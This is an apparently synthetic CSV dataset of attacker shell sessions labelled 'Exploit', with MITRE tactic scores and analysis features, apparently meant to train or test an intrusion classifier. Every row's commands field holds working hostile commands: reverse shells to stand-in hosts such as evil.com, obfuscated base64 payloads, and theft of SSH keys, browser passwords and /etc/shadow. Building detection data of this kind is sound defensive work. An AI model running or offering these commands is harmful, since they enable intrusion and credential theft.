session_id,src_ip,num_commands,duration_sec,commands,label_id,label_name,mitre_tactic_reconnaissance,mitre_tactic_resource_development,mitre_tactic_initial_access,mitre_tactic_execution,mitre_tactic_persistence,mitre_tactic_privilege_escalation,mitre_tactic_defense_evasion,mitre_tactic_credential_access,mitre_tactic_discovery,mitre_tactic_lateral_movement,mitre_tactic_collection,mitre_tactic_command_and_control,mitre_tactic_exfiltration,mitre_tactic_impact,mitre_severity_max,mitre_severity_mean,mitre_severity_weighted,mitre_kill_chain_score,mitre_unique_technique_count,mitre_total_commands,mitre_matched_commands,triage_file_size,triage_entropy,triage_priority,triage_is_go,triage_is_packed,triage_is_stripped,triage_is_dll,triage_is_static,triage_score_mining,triage_score_botnet,triage_score_recon,triage_score_destructive,ghidra_function_count,ghidra_total_instructions,ghidra_total_basic_blocks,ghidra_max_function_size,ghidra_avg_callers,ghidra_max_callers,ghidra_mining_pool_count,ghidra_crypto_wallet_count,ghidra_ip_count,ghidra_url_count,ghidra_shell_cmd_count,ghidra_file_path_count,ghidra_imports_file_io,ghidra_imports_process,ghidra_imports_network,ghidra_imports_crypto,ghidra_imports_evasion,ghidra_has_aes_sbox,ghidra_has_sha256_constants,ghidra_has_rc4_state,ghidra_has_xor_loop,ghidra_go_user_functions,ghidra_go_runtime_functions,angr_basic_blocks,angr_edges,angr_functions_recovered,angr_cyclomatic_complexity,angr_function_count,angr_user_functions_listed,angr_syscalls_network,angr_syscalls_file_io,angr_syscalls_process,angr_syscalls_memory,angr_ip_count,angr_url_count,angr_mining_indicator_count,angr_shell_cmd_count,angr_has_network,angr_has_file_manipulation,angr_has_process_control,angr_has_crypto,angr_has_mining,angr_has_persistence,angr_has_evasion,angr_has_shell_execution,angr_complexity_tier,angr_is_partial,angr_loaded_as_blob,script_line_count,script_url_count,script_download_count,script_arch_count,script_is_downloader,script_is_multi_arch,script_is_miner,script_has_persistence,script_has_anti_forensics,has_ghidra_results,has_angr_results,has_script_results,deep_func_ratio_angr_ghidra,deep_mining_signal_count,deep_total_network_indicators,deep_total_crypto_indicators,deep_max_complexity,deep_total_evasion_indicators,deep_is_go_consensus,num_downloads,download_shas
synth_exploit_657089,90.136.160.17,6,440.8526896662762,nc 10.10.10.10 443 -e /bin/bash ; find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \; ; LD_PRELOAD=/tmp/.lib.so /bin/ls ; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' ; cat ~/.ssh/id_ecdsa,3,Exploit,0.8104341098767364,0.0,0.4574319561583571,4.195229513407542,1.687353095950788,3.6503580816981778,2.7955815491331717,3.9018928385392853,1.6616871298313016,0.45015570387789383,2.595657082207086,2.9513975154633068,0.17892927868031872,0.0,8.328422519692012,6.363201144363565,6.45002700634312,4.924102210855413,7,12,11,848789.849834326,7.1915006590794865,72.55311537318396,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_909655,80.33.155.89,11,170.54591830967107,"sudo su; php -r '$sock=fsockopen(""evil.com"",4444);exec(""/bin/sh -i <&3 >&3 2>&3"");'; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.10.10.10"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",3,Exploit,0.36492966311014263,0.0,0.618313525394122,3.9747202503287866,1.9899331787414454,2.724710057165998,2.246487920979943,6.594213373639338,2.088888913949151,1.1194159302088547,2.884882690162157,3.961274205586218,1.518373421055268,0.0,8.352548887453192,7.539414409665914,7.232166769556544,4.9069883925578015,7,14,10,1383739.293243963,7.356385931183173,60.45778350492077,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,16.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_647864,193.129.147.177,8,855.6873891609443,"LD_PRELOAD=/tmp/.lib.so /bin/ls; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""; john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt; cat ~/.ssh/id_ecdsa; cat /etc/security/opasswd; bash -c 'bash -i >& /dev/tcp/evil.com/8080 0>&1'; pkexec /bin/bash; cat /etc/security/passwd",3,Exploit,0.1332901529528162,0.0,0.8866778695154062,2.035639957767619,1.6106924936521556,2.8240818622100874,3.353731176844298,7.2808707165156985,2.7097187374737466,0.8595500983565982,2.296936873920339,3.991337864660953,0.45543355033343036,0.0,9.328279840498073,5.273151198493924,6.030365308196805,6.49746583142973,11,8,8,1571291.581845766,7.424429110078928,80.45437611004854,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_395831,141.18.253.175,6,765.1707616361615,sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins' && find /home -name 'id_rsa' -exec cat {} \; && sudo su && cat /etc/shadow && gdb -p $(pgrep sshd) -ex 'dump memory /tmp/dump.bin 0x0 0xffffffff' -ex quit,3,Exploit,0.7731165815598687,0.0,0.4850946745183059,3.063856039805408,0.38622768029231036,2.6852028331679785,4.873707334689712,5.095835055737247,1.8573776330984721,1.769000278251218,1.1840729743865497,2.198260342000018,0.36014366067170633,0.0,9.720234436401936,7.444222968756885,6.104314607433915,6.723767717324595,6,7,10,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_519940,124.233.130.117,6,819.4901613559941,cat /root/.ssh/id_rsa ; eval $(echo '6563686f2027707775656427' | xxd -r -p) ; cat ~/.ssh/known_hosts ; cat /etc/security/opasswd ; cat ~/.bash_history ; cat ~/.ssh/known_hosts,3,Exploit,0.03472288546422808,0.0,0.9436007651718894,3.5707682607660334,1.972938035361211,3.1219150446910366,3.247556835307135,4.1379107528615275,2.1930925523261053,1.3775606885395744,1.0754368303545883,3.478301399254816,1.0362331957883082,0.0,8.741999599394113,5.944350872350467,6.910765279273294,6.546078437354451,8,13,7,1007272.3538353824,6.292497038038124,69.85766817588495,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0,0.0,9.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,10.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_328501,98.27.249.253,14,991.7716891470714,"cat ~/.ssh/id_rsa; cat /root/.ssh/id_rsa; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""10.10.10.10"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; cat ~/.python_history; find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;; bash -i >& /dev/tcp/10.10.10.10/4444 0>&1; grep -r 'DB_PASSWORD' /var/www 2>/dev/null",3,Exploit,0.700300846867581,0.0,0.7297299141161163,2.3093038902763414,0.9466778418374877,3.1337891147128634,3.289080304978024,5.020318028599242,2.534366089975448,0.6388446144152906,2.062950263497034,3.2474026172376385,0.41489451193119975,0.0,9.754769191062756,6.123248375050382,7.515427682866346,7.050584420861749,7,5,8,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_779198,182.136.66.254,5,323.67908433358406,cat /etc/security/opasswd; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.100 9001 > /tmp/f; history,3,Exploit,0.19419807634879394,0.0,0.7388231532556876,3.8982941202102666,0.7913053728771611,2.439023368360863,4.953819881445414,7.1011726752080495,2.418315539593425,0.08118846385611844,2.354077801611821,1.5155733150728439,0.6127859423483883,0.0,9.70522678616902,5.668369894739545,7.166394176046158,4.372603712834193,10,14,5,1540179.243050771,6.508183903325505,56.20792129577363,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,9.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_315966,121.23.41.99,17,414.4911734787093,"cat ~/.ssh/known_hosts; cat /var/www/html/config.php; unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((""192.168.1.100"",8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; cat ~/.mozilla/firefox/*.default/logins.json; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker.net 8080 > /tmp/f; python -c 'import os;os.setuid(0);os.system(""/bin/bash"")'",3,Exploit,0.1470704326934007,0.0,0.5953917876616213,2.5854124624008756,1.1838730111648186,2.2874775892398733,4.233274048317707,3.9085774578596073,2.831362617435346,0.3297605717171508,2.1671727288944953,2.0771246511542936,1.0880069455767793,0.0,9.043195841170231,5.26592234211729,8.021098794055984,4.692752600384789,5,6,7,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_335186,86.50.253.204,2,153.61651589284426,cat /etc/mysql/my.cnf | grep password; cat ~/.ssh/id_ecdsa,3,Exploit,0.7249343800823237,0.0,0.0822595890679253,2.0762257357689804,1.7400784205716033,4.088360043869358,3.551532655284943,6.317770720526008,2.3286271287550147,1.1708987379425615,2.5906258343803215,2.8659348202217476,1.5922099561452545,0.0,8.961448720860071,7.166594950772797,7.62334938964464,7.160604171546899,5,8,5,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_207715,173.119.234.18,5,1122.9436367065646,cat /etc/shadow; cat ~/.zsh_history; cat ~/.ssh/id_dsa; cat ~/.ssh/known_hosts; hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt,3,Exploit,0.671824917337115,0.0,0.580262194550485,3.6405879260271687,1.3727260962952923,4.996738465672374,4.647161204735362,3.8768071845030923,2.1943530901084145,1.683551268358131,1.8918284513764367,2.999182311647848,0.37672714716064437,0.0,7.2898151137677285,7.2058493400160515,8.683374249779174,7.399887563261403,11,12,8,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_395960,216.231.237.168,3,1034.1044135971208,cat ~/.python_history; cat ~/.ssh/authorized_keys; grep -r 'password' /var/www 2>/dev/null,3,Exploit,0.12945358491523828,0.0,0.856839421160352,3.987696450499314,0.32952749768831424,4.734852919527121,3.3378124124287005,7.014381967003019,2.8849707710426404,1.5872178837659434,1.0570233864029512,2.522155475261368,0.8236930681501347,0.0,8.657307322288741,7.10486462684621,6.246317365571602,7.2070823933473225,5,5,6,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_943283,168.144.7.101,7,635.6338510366691,cat /etc/master.passwd ; john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt ; cat /root/.ssh/id_rsa ; cat ~/.mozilla/firefox/*.default/logins.json ; cat ~/.mysql_history ; cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass ; unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt,3,Exploit,0.8492578223901851,0.0,0.7382396236319927,3.2229239100867155,1.5845930928895073,3.5564267811622443,2.816082778363749,4.975471946294256,1.502301498602207,0.0949528883250157,1.7720278749863332,1.19600832858583,1.7559865637540268,0.0,9.941552994662873,6.851848396831377,8.11994132707743,6.549057815214496,11,11,4,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_916893,82.221.245.135,2,779.5211309395206,sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins'; hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt,3,Exploit,0.6153133182116685,0.0,0.17016241535660737,2.1534415807347367,0.020501521839860315,2.5512751633116273,3.176212098492678,4.183742249800786,2.0533324973018963,0.41320706184815825,1.0231159262300875,2.770888743097083,0.5808587254745863,0.0,8.714111505060439,6.857213924617446,7.64271289382587,5.1594907540480595,5,6,5,213220.8852034535,6.153092418631211,52.77196435691021,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_199608,19.98.199.56,6,699.6208230650797,grep -r 'password' /var/www 2>/dev/null; unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt; grep -r 'DB_PASSWORD' /var/www 2>/dev/null; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins'; history; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins',3,Exploit,0.3778622575287317,0.0,0.7268717409192235,3.7899854221707256,0.4027988990721021,4.695867509500951,4.72488294719334,3.4609011431378174,1.3120812217964746,0.3923821112670214,2.9959578599146695,3.1017797184775793,1.6413508506284429,0.0,7.428919010058406,5.12085185687678,6.582352257701376,4.065789549501551,11,9,4,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_711913,213.205.217.58,7,656.661021908173,"nc -e /bin/sh evil.com 8080; grep -r 'password' /var/www 2>/dev/null; cat /etc/passwd && cat /etc/shadow; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""; sudo su; strings /dev/mem | grep -i password",3,Exploit,0.7545859424001633,0.0,0.9896567439152516,2.5082766641809298,0.7066113687899311,3.239840144551234,2.4191794108286637,4.3167125873133685,1.811798424747,1.3382443977197267,2.3962965540653864,1.7968135537012389,0.48965250246134717,0.0,7.958970650781888,5.014527802141655,6.76661601287696,6.19235605899524,11,8,10,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_896450,168.188.84.50,10,1026.6927972762733,"find / -perm -4000 -type f 2>/dev/null -exec ls -la {} \;; sqlite3 ~/.config/google-chrome/Default/Login\ Data 'SELECT * FROM logins'; sudo su; eval $(echo '6563686f2027707775656427' | xxd -r -p); nc -e /bin/sh 192.168.1.100 4444; /usr/bin/find /tmp -exec /bin/sh \;; strings /dev/mem | grep -i password; python -c ""exec(__import__('base64').b64decode('YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE='))""",3,Exploit,0.5172967008977682,0.0,0.8948195658307692,2.994371517571376,1.3727253121696612,3.490468525043841,2.7225914464598095,4.0152225224894,1.784741117483223,1.698176091959161,1.777220998442103,1.0543017010589293,1.2692494650683843,0.0,8.787276065092183,6.039818118767869,6.491207031940924,4.876421185475293,6,6,12,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
synth_exploit_278948,25.137.186.234,4,125.4772589448332,"base64 -d <<< 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=' | sh && ruby -rsocket -e'f=TCPSocket.open(""evil.com"",80).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' && cat ~/.ssh/authorized_keys",3,Exploit,0.3864934912692639,0.0,0.9991713023454404,3.1823422329943925,0.9589981730229256,4.576633409209783,3.0782252849051255,4.530311733641771,2.0594670244767217,1.7271243855665792,1.4205273508072407,2.5475446320514745,0.6548713933514541,0.0,9.190506863855154,7.444937979752928,7.490919188334766,7.440677032941252,8,15,11,458155.6247196395,7.075630037378745,58.465088051210095,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,5.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,15.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_754190,27.124.76.253,20,286.40676272488986,"cat ~/.psql_history; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.net"",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'; cat /etc/mysql/my.cnf | grep password; perl -e 'use Socket;$i=""evil.com"";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"")'; cat /etc/shadow; cat ~/.config/google-chrome/Default/Login\ Data",3,Exploit,0.8526497955343914,0.0,0.9995640560630389,3.3456750081525355,1.0295002174575565,3.578584763968096,2.2776440960175863,5.707086688128998,2.712053494592415,1.328819482093308,1.5749399750142101,1.3336558719434861,1.3088290316176883,0.0,7.534117237980926,6.81689793454661,8.633497916799811,4.779632183927934,10,11,5,1535593.451884861,6.939007749454242,84.57542504163655,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,8.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1,
synth_exploit_324172,63.238.155.9,5,652.9382080818699,cat /etc/security/opasswd ; bash -i >& /dev/tcp/10.10.10.10/1234 0>&1 ; strings /dev/mem | grep -i password ; cat ~/.mozilla/firefox/*.default/logins.json ; cat ~/.mysql_history,3,Exploit,0.37963784031000813,0.0,0.9351502445824053,2.5170652809232896,1.6567009956242411,3.026155438015743,2.702378870870694,7.817485287750413,2.6130061832252665,1.7777095917813923,1.8636166481353547,2.140493215252027,1.4965394502468918,0.0,7.1991468058454124,5.245305543792498,6.2631248371671235,5.850884934426709,9,13,8,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0,
